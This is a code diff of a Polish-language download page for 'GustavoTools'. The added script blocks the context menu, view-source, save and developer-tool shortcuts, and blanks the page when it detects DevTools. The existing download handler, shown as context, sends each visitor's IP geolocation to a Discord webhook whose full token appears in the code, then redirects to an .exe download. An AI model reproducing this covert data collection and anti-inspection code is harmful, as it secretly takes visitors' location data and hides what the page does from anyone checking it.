@@ -38,11 +38,42 @@
 </head>
 <body>
   <h1>GustavoTools</h1>
-
-  <!-- 1.1.0 -->
   <button onclick="handleDownload()">Pobierz najnowszą wersję</button>
 
   <script>
+    // 🔒 Blokowanie narzędzi deweloperskich
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    document.addEventListener("keydown", function (e) {
+      const blockedCombos = [
+        (e.ctrlKey && e.key.toLowerCase() === "u"),       // Ctrl+U
+        (e.key === "F12"),                                 // F12
+        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i"), // Ctrl+Shift+I
+        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "j"), // Ctrl+Shift+J
+        (e.ctrlKey && e.key.toLowerCase() === "s"),        // Ctrl+S
+        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "c")  // Ctrl+Shift+C
+      ];
+      if (blockedCombos.some(Boolean)) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // 🚨 Wykrywanie DevTools przez analizę rozmiaru okna
+    (function () {
+      const threshold = 160;
+      setInterval(() => {
+        const devtoolsOpened = (
+          window.outerWidth - window.innerWidth > threshold ||
+          window.outerHeight - window.innerHeight > threshold
+        );
+        if (devtoolsOpened) {
+          document.body.innerHTML = "<h1 style='color:red'>Zabronione narzędzia deweloperskie</h1>";
+        }
+      }, 1000);
+    })();
+
+    // 📥 Obsługa pobierania
     async function handleDownload() {
       try {
         const location = await fetch("https://ipapi.co/json/").then(res => res.json());
@@ -61,16 +92,14 @@
 
         await fetch("https://discord.com/api/webhooks/1391547254036500540/sWJmd-1sylhKt6FNVXSw63FYu9A_AhKLERYI1xugPGleIgM1YCJBfWnFVaV4wDQiQUoQ", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: message })
         });
       } catch (error) {
         console.warn("Nie udało się wysłać danych na webhook (CORS?):", error);
       }
 
-      // 🔽 Pobranie pliku z GitHub Releases
+      // 🔽 Pobierz plik
       window.location.href = "https://github.com/kostek1123Q/gustavotools1.1.0/releases/download/v.1.1.0/GustavoTools1.1.0.exe";
     }
   </script>
